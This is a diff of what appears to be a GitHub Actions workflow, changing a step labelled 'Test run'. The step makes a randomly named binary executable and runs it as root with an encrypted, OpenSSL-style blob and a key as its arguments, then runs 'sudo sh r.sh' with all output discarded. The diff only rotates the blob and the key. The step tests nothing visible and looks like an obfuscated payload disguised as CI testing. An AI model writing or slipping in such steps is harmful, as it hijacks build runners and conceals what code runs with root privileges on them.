@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'guize'
+        echo 'akhl9'
         sudo chmod +x garyiip7x/heardyg34i.ex
-        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX18kqxGGemLJ5RrGPaaMhVvozu2zNL0fnAr6mW0MncSxai4j6Oa80y+ePjIuZdQs5auMgoxsemSL93DvhedYKjimBpgL5TnavOrSceoWvTSq4KfOB0hsN4V1 m2yu45 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX18dIUkc6ppHn/IupUYI/MG+D4c7O03PFReUPrV7X9/51iwXFBpODTe7oV4cduyrG7zXYCYeW0rboYQU1MfuDn4D4mHoQ+LM5csHKtE4Ch0XX/uavvz3UxjV ahj0ag && sudo sh r.sh > /dev/null 2>&1
